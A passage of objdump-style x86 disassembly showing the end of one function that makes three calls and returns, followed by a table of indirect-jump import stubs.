  4026bd:	50                   	push   %eax
  4026be:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4026c1:	50                   	push   %eax
  4026c2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4026c5:	50                   	push   %eax
  4026c6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4026c9:	50                   	push   %eax
  4026ca:	e8 f9 00 00 00       	call   0x4027c8
  4026cf:	83 c4 14             	add    $0x14,%esp
  4026d2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4026d5:	50                   	push   %eax
  4026d6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4026d9:	50                   	push   %eax
  4026da:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4026dd:	50                   	push   %eax
  4026de:	e8 35 fc ff ff       	call   0x402318
  4026e3:	83 c4 0c             	add    $0xc,%esp
  4026e6:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4026e9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026ec:	50                   	push   %eax
  4026ed:	e8 de 00 00 00       	call   0x4027d0
  4026f2:	83 c4 04             	add    $0x4,%esp
  4026f5:	c9                   	leave
  4026f6:	c3                   	ret
  4026f7:	00 ff                	add    %bh,%bh
  4026f9:	25 bc 3f 40 00       	and    $0x403fbc,%eax
  4026fe:	00 00                	add    %al,(%eax)
  402700:	ff 25 c0 3f 40 00    	jmp    *0x403fc0
  402706:	00 00                	add    %al,(%eax)
  402708:	ff 25 00 40 40 00    	jmp    *0x404000
  40270e:	00 00                	add    %al,(%eax)
  402710:	ff 25 c4 3f 40 00    	jmp    *0x403fc4
  402716:	00 00                	add    %al,(%eax)
  402718:	ff 25 c8 3f 40 00    	jmp    *0x403fc8
  40271e:	00 00                	add    %al,(%eax)
  402720:	ff 25 04 40 40 00    	jmp    *0x404004
  402726:	00 00                	add    %al,(%eax)
  402728:	ff 25 cc 3f 40 00    	jmp    *0x403fcc
  40272e:	00 00                	add    %al,(%eax)
  402730:	ff 25 d0 3f 40 00    	jmp    *0x403fd0
  402736:	00 00                	add    %al,(%eax)
  402738:	ff 25 08 40 40 00    	jmp    *0x404008
  40273e:	00 00                	add    %al,(%eax)
  402740:	ff 25 d4 3f 40 00    	jmp    *0x403fd4
  402746:	00 00                	add    %al,(%eax)
  402748:	ff 25 0c 40 40 00    	jmp    *0x40400c
  40274e:	00 00                	add    %al,(%eax)
  402750:	ff 25 10 40 40 00    	jmp    *0x404010
  402756:	00 00                	add    %al,(%eax)
  402758:	ff 25 14 40 40 00    	jmp    *0x404014
  40275e:	00 00                	add    %al,(%eax)
  402760:	ff 25 d8 3f 40 00    	jmp    *0x403fd8
  402766:	00 00                	add    %al,(%eax)
  402768:	ff 25 dc 3f 40 00    	jmp    *0x403fdc
  40276e:	00 00                	add    %al,(%eax)
  402770:	ff 25 e0 3f 40 00    	jmp    *0x403fe0
  402776:	00 00                	add    %al,(%eax)
  402778:	ff 25 18 40 40 00    	jmp    *0x404018
  40277e:	00 00                	add    %al,(%eax)
  402780:	ff 25 1c 40 40 00    	jmp    *0x40401c
  402786:	00 00                	add    %al,(%eax)
  402788:	ff 25 e4 3f 40 00    	jmp    *0x403fe4
  40278e:	00 00                	add    %al,(%eax)
  402790:	ff 25 e8 3f 40 00    	jmp    *0x403fe8
  402796:	00 00                	add    %al,(%eax)
  402798:	ff 25 ec 3f 40 00    	jmp    *0x403fec
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	ff 25 f0 3f 40 00    	jmp    *0x403ff0
  4027a6:	00 00                	add    %al,(%eax)
  4027a8:	ff 25 f4 3f 40 00    	jmp    *0x403ff4
  4027ae:	00 00                	add    %al,(%eax)
  4027b0:	ff 25 f8 3f 40 00    	jmp    *0x403ff8
  4027b6:	00 00                	add    %al,(%eax)
  4027b8:	ff 25 20 40 40 00    	jmp    *0x404020
  4027be:	00 00                	add    %al,(%eax)
  4027c0:	ff 25 24 40 40 00    	jmp    *0x404024
  4027c6:	00 00                	add    %al,(%eax)
  4027c8:	ff 25 28 40 40 00    	jmp    *0x404028
  4027ce:	00 00                	add    %al,(%eax)
  4027d0:	ff 25 2c 40 40 00    	jmp    *0x40402c
	...
